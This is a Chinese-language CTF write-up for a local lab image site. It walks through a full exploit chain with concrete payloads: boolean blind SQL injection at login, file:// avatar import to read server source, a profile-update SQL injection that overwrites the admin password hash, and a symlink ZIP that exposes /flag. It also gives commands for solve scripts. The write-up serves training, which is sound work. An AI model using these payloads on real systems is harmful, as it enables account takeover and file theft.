# 点兔图像站完整复现 WP

这份 WP 对应当前目录中的最新靶场实现。当前版本的关键变化是：

- `encrypt.py` 使用环境变量 `PASSWORD_PEPPER` 作为秘密值
- 即使源码泄露，选手也不能本地计算任意密码的密文
- 正确做法变成：先注册普通用户，再通过登录处布尔盲注拿到自己账号的密文，最后用资料编辑 SQL 注入把 `admin.password` 改成这个密文

配套脚本：

- [solve/blind_extract_admin_hash.py](/mnt/c/Users/30882/Desktop/WHUCTF2026/注注need/solve/blind_extract_admin_hash.py)
- [solve/make_flag_symlink_zip.py](/mnt/c/Users/30882/Desktop/WHUCTF2026/注注need/solve/make_flag_symlink_zip.py)
- [solve/full_chain.py](/mnt/c/Users/30882/Desktop/WHUCTF2026/注注need/solve/full_chain.py)

## 1. 攻击链总览

当前预期利用链：

1. 注册普通用户并登录
2. 利用登录处布尔盲注，提取自己账号的 `password` 密文
3. 登录后利用头像 URL 导入读取 `/app/app.py`，确认后台路径和 ZIP 解压逻辑
4. 利用资料编辑处可写 SQL 注入，把 `admin.password` 改成自己的密文
5. 退出并使用自己的明文密码登录 `admin`
6. 上传包含 `/flag` 软链接的 ZIP
7. 访问 `/images/flag.png` 读出 flag

## 2. 关键点分析

### 2.1 登录处布尔盲注

[app/app.py](/mnt/c/Users/30882/Desktop/WHUCTF2026/注注need/app/app.py) 中登录 SQL：

```sql
SELECT id, username, password, nickname, bio, email, avatar, role
FROM users
WHERE username = '<payload>'
LIMIT 1
```

`username` 直接拼接，且页面有两种可区分回显：

- 查询命中用户但密码不对：`密码错误`
- 查询不到用户：`用户不存在`

因此可以用：

```sql
' OR (<condition>) #
```

做布尔盲注。

### 2.2 为什么不能再本地算密文

[app/encrypt.py](/mnt/c/Users/30882/Desktop/WHUCTF2026/注注need/app/encrypt.py) 已改成：

```python
pepper = os.environ.get("PASSWORD_PEPPER")
```

也就是说：

- 即使读到 `encrypt.py`
- 也只知道“使用了环境变量中的秘密值”
- 但不知道真实 `PASSWORD_PEPPER`

所以不能再像旧版本那样本地计算任意密码哈希。

### 2.3 头像 URL 导入的作用

`/profile` 的 `action=remote_avatar` 支持：

```text
file:///app/app.py
file:///app/encrypt.py
```

但拒绝：

```text
file:///flag
```

这一步主要用于读取源码、确认：

- 资料编辑注入点在 `/profile`
- 管理员上传点在 `/admin/upload`
- ZIP 解压目录是 `/app/static/images/`
- `/flag` 被显式拦截，不能一步打穿

## 3. 第一步：注册普通用户

手工操作：

1. 访问 `http://127.0.0.1:8080/register`
2. 注册任意账号，例如：
   - 用户名：`solver`
   - 密码：`solver123456`
3. 登录该用户

这一步很重要，因为后续我们要提取的不是 `admin` 的密文，而是“自己账号”的密文。

## 4. 第二步：布尔盲注提取自己的密文

假设当前注册的用户名是 `solver`。

### 4.1 测密文长度

示例 payload：

```sql
' OR (length((select password from users where username='solver' limit 1))=64) #
```

如果页面显示 `密码错误`，说明条件为真。

### 4.2 逐位提取

示例 payload：

```sql
' OR (ascii(substr((select password from users where username='solver' limit 1),1,1))=57) #
```

### 4.3 直接使用脚本

```bash
python3 solve/blind_extract_admin_hash.py --base-url http://127.0.0.1:8080 --username solver
```

虽然脚本名还叫 `blind_extract_admin_hash.py`，但现在它已经是“通用账号哈希提取脚本”，默认就是提取你指定用户的哈希。

拿到的结果就是你自己账号的 `password` 密文，例如：

```text
aaaaaaaa...bbbb
```

这个哈希虽然无法本地计算，但已经可以直接拿来覆盖 `admin.password`。

## 5. 第三步：读取源码确认利用点

登录后访问个人中心，在“URL 导入头像”中填：

```text
file:///app/app.py
```

提交后，站点会把读取到的文件内容保存为你的头像文件。接着在个人中心页面打开头像链接，就能拿到 `app.py` 源码。

你会从源码中确认到：

- `/profile` 存在拼接式 `UPDATE`
- `/admin/upload` 只校验管理员权限和 ZIP 路径穿越
- `unzip` 会保留软链接
- `/images/<filename>` 最终 `send_file`

## 6. 第四步：资料编辑 SQL 注入改写 admin 密码

资料编辑 SQL：

```sql
UPDATE users SET
nickname='<nickname>',
bio='<bio>',
email='<email>'
WHERE id=<current_user_id>
```

因此可以把 `nickname` 构造成：

```sql
x', password='<自己的密文>' WHERE username='admin' #
```

拼接后变成：

```sql
UPDATE users SET
nickname='x',
password='<自己的密文>' WHERE username='admin' #',
bio='...',
email='...'
WHERE id=2
```

后续内容被 `#` 注释掉，于是最终效果是：

```sql
UPDATE users SET password='<自己的密文>' WHERE username='admin'
```

### 6.1 手工请求示例

向 `/profile` 发 POST：

```x-www-form-urlencoded
action=profile
nickname=x', password='这里填你盲注出来的自己密文' WHERE username='admin' #
bio=test
email=test@example.com
```

提交成功后，`admin.password` 已经和你的用户密码哈希一致。

## 7. 第五步：用自己的明文密码登录 admin

现在直接登录：

- 用户名：`admin`
- 密码：你注册普通用户时使用的明文密码，例如 `solver123456`

因为 `admin.password` 已被改成你自己的哈希，所以登录会成功。

## 8. 第六步：构造软链接 ZIP

管理员上传只做了这些限制：

- 文件后缀必须是 `.zip`
- ZIP 内路径不能以 `/` 开头
- ZIP 内路径不能包含 `..`

但它没有禁止软链接。

所以只要构造一个 ZIP，其中包含：

```text
flag.png -> /flag
```

即可。

### 8.1 使用脚本生成

```bash
python3 solve/make_flag_symlink_zip.py -o exploit.zip
```

### 8.2 手工生成

```bash
ln -s /flag flag.png
zip -y exploit.zip flag.png
```

## 9. 第七步：上传 ZIP 并读 flag

管理员登录后访问：

```text
http://127.0.0.1:8080/admin/upload
```

上传 `exploit.zip`。

由于后端执行：

```python
subprocess.run(
    ["unzip", "-o", str(archive_path), "-d", str(IMAGE_DIR)],
    ...
)
```

软链接会被保留到图片目录。

随后访问：

```text
http://127.0.0.1:8080/images/flag.png
```

即可读出 `/flag` 的内容。

## 10. 一键复现

### 10.1 启动靶场

建议清卷重启，保证数据库和当前密码逻辑一致：

```bash
export PASSWORD_PEPPER='your-secret-pepper'
docker compose down -v
docker compose up --build
```

### 10.2 生成 ZIP

```bash
python3 solve/make_flag_symlink_zip.py -o exploit.zip
```

### 10.3 运行全链路脚本

```bash
python3 solve/full_chain.py --base-url http://127.0.0.1:8080 --username solver --password solver123456 --zip exploit.zip
```

这个脚本会自动完成：

1. 注册普通用户
2. 登录普通用户
3. 读取 `/app/app.py`
4. 通过登录页布尔盲注提取 `solver.password`
5. 用资料编辑 SQL 注入把 `admin.password` 改成该密文
6. 登录 `admin`
7. 上传软链接 ZIP
8. 访问 `/images/flag.png`

## 11. 单独脚本说明

### 11.1 提取任意用户名的哈希

```bash
python3 solve/blind_extract_admin_hash.py --base-url http://127.0.0.1:8080 --username solver
```

### 11.2 生成软链接 ZIP

```bash
python3 solve/make_flag_symlink_zip.py -o exploit.zip
```

### 11.3 一键跑完整链

```bash
python3 solve/full_chain.py --base-url http://127.0.0.1:8080 --username solver --password solver123456 --zip exploit.zip
```

## 12. 总结

这版题目的核心不再是“读源码后本地复现加密算法”，而是：

1. 环境变量保护了真正的密码秘密值
2. 选手必须通过布尔盲注拿到自己账号的真实密文
3. 再利用可写 SQL 注入把 `admin.password` 覆盖成这个密文
4. 最后通过管理员 ZIP 软链接读 flag

这条链条比旧版本更合理，也更符合你现在的设计目标。
